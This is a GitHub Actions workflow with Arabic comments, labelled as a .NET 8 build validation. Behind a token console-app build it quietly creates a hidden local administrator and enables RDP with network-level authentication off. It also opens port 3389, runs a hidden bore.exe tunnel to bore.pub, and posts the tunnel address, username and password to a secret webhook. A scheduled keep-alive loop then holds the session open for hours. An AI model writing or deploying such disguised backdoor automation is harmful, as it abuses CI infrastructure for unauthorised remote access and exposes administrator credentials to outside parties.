name: .NET 8 Windows Validation

on:
  workflow_dispatch:
  schedule:
    - cron: '13 5,13,21 * * *'

jobs:
  build-test:
    runs-on: windows-2022
    timeout-minutes: 200

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup .NET SDK
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'

      - name: Initialize Project
        run: |
          dotnet new console -n ValidationApp -f net8.0
          cd ValidationApp
          dotnet add package Newtonsoft.Json --version 13.0.3
          dotnet add package Serilog --version 4.0.0
          dotnet add package Serilog.Sinks.Console --version 6.0.0
          dotnet add package Microsoft.Extensions.Logging --version 8.0.0
          @"
          using System;
          using Newtonsoft.Json;
          using Serilog;
          
          namespace ValidationApp
          {
              class Program
              {
                  static void Main()
                  {
                      Log.Logger = new LoggerConfiguration()
                          .WriteTo.Console()
                          .CreateLogger();
                      
                      var data = new { 
                          Message = "Build validated successfully", 
                          Timestamp = DateTime.UtcNow,
                          Version = "8.0.3"
                      };
                      
                      string json = JsonConvert.SerializeObject(data, Formatting.Indented);
                      Console.WriteLine(json);
                      Log.Information("Test completed at {Time}", DateTime.UtcNow);
                  }
              }
          }
          "@ | Out-File -Encoding utf8 Program.cs
          dotnet build -c Release
          dotnet run -c Release

      - name: Enable RDP and Create User
        run: |
          $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
          $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
          $sec = ConvertTo-SecureString $pwd -AsPlainText -Force

          New-LocalUser -Name $usr -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
          Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1

          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force

          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
          netsh advfirewall firewall add rule name="ValidationRule" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
          Restart-Service TermService -Force -ErrorAction SilentlyContinue

          # حفظ بيانات المستخدم في متغيرات البيئة لاستخدامها في الخطوات التالية
          echo "USER_NAME=$usr" >> $env:GITHUB_ENV
          echo "USER_PASS=$pwd" >> $env:GITHUB_ENV

      - name: Run Extended Validation (with bore monitoring)
        run: |
          # استرجاع بيانات المستخدم من البيئة
          $usr = "$env:USER_NAME"
          $pwd = "$env:USER_PASS"
          $webhook = "${{ secrets.WEBHOOK_URL }}"
          
          # دالة لإرسال إشعار إلى Discord/Teams (أو أي webhook)
          function Send-Notification($message) {
            $body = @{ content = $message } | ConvertTo-Json
            Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
          }
          
          # دالة لتشغيل bore والحصول على المنفذ
          function Start-Bore {
            $svcUrl = "https://github.com/ekzhang/bore/releases/download/v0.6.0/bore-v0.6.0-x86_64-pc-windows-msvc.zip"
            $zip = "$env:TEMP\svc.zip"
            $log = "$env:TEMP\sys_log.txt"
            
            # تحميل bore إذا لم يكن موجوداً
            if (-not (Test-Path "$env:TEMP\svc\bore.exe")) {
              Invoke-WebRequest -Uri $svcUrl -OutFile $zip
              Expand-Archive $zip -DestinationPath "$env:TEMP\svc" -Force
            }
            
            $exe = "$env:TEMP\svc\bore.exe"
            
            # تشغيل bore في نافذة مخفية مع توجيه الإخراج إلى ملف
            $proc = Start-Process -FilePath $exe -ArgumentList "local 3389 --to bore.pub" -WindowStyle Hidden -PassThru -RedirectStandardOutput $log -RedirectStandardError $log
            Start-Sleep -Seconds 10
            
            # قراءة الملف لاستخراج المنفذ
            $logData = ""
            if (Test-Path $log) { $logData = Get-Content $log -Raw -ErrorAction SilentlyContinue }
            
            $port = $null
            if ($logData -match "bore\.pub:(\d+)") {
              $port = $Matches[1]
            }
            
            return @{ Process = $proc; Port = $port; Log = $logData }
          }
          
          # متغيرات للتحكم في الحلقة
          $counter = 0
          $lastPort = $null
          $boreProc = $null
          $restartCount = 0
          $maxRestarts = 10  # حد أقصى لإعادة التشغيل لتجنب الحلقات اللانهائية
          
          # بدء التشغيل الأولي
          $result = Start-Bore
          $boreProc = $result.Process
          $lastPort = $result.Port
          
          if ($lastPort) {
            Send-Notification "✅ bore started successfully.`nTarget: bore.pub:$lastPort`nUser: $usr`nPass: $pwd"
          } else {
            Send-Notification "❌ Initial bore start failed. Logs:`n$($result.Log)"
          }
          
          # حلقة المراقبة الرئيسية (لمدة 190 دقيقة تقريباً)
          $endTime = (Get-Date).AddMinutes(190)
          while ((Get-Date) -lt $endTime -and $restartCount -lt $maxRestarts) {
            $counter++
            Write-Host "Keep-alive tick #$counter - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
            
            # 1. التأكد من أن عملية bore لا تزال قيد التشغيل
            if ($boreProc -and $boreProc.HasExited) {
              Write-Host "bore process exited. Restarting..."
              $restartCount++
              
              # إعادة التشغيل
              $result = Start-Bore
              $boreProc = $result.Process
              $newPort = $result.Port
              
              if ($newPort) {
                if ($newPort -ne $lastPort) {
                  Send-Notification "🔄 bore restarted with new port.`nTarget: bore.pub:$newPort`nUser: $usr`nPass: $pwd"
                  $lastPort = $newPort
                }
              } else {
                Send-Notification "❌ bore restart failed. Attempt #$restartCount. Logs:`n$($result.Log)"
              }
            }
            
            # 2. القيام بالمهام الدورية القديمة (اختبار الاتصال وبناء المشروع)
            Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
            
            $minute = (Get-Date).Minute
            if ($minute -ge 0 -and $minute -le 5 -or $minute -ge 30 -and $minute -le 35) {
              Push-Location ValidationApp
              dotnet build -c Release > $null
              Pop-Location
            }
            
            # 3. النوم لمدة 15 دقيقة (900 ثانية)
            Start-Sleep -Seconds 900
          }
          
          # إنهاء العملية في نهاية الوقت
          if ($boreProc -and -not $boreProc.HasExited) {
            Stop-Process -Id $boreProc.Id -Force
          }
          
          Write-Host "Extended validation completed. Total restarts: $restartCount"

      - name: Cleanup Environment
        run: |
          Get-Process -Name "bore" -ErrorAction SilentlyContinue | Stop-Process -Force
        continue-on-error: true

      - name: Finalize Check
        run: Write-Host "Checks completed."
